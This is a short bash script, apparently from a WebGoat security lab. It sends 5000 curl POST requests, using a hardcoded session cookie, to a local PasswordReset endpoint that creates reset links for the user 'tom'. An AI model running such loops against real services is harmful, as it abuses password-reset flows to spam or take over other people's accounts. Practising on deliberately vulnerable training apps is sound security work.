
for i in {1..5000}
do
    curl -d "email=tom%40webgoat-cloud.org" -H "Cookie: JSESSIONID=ED6E5B9C6662879D1B60F54D0FEBE2BF" -X POST http://127.0.0.1:8080/WebGoat/PasswordReset/reset/create-password-reset-link
done
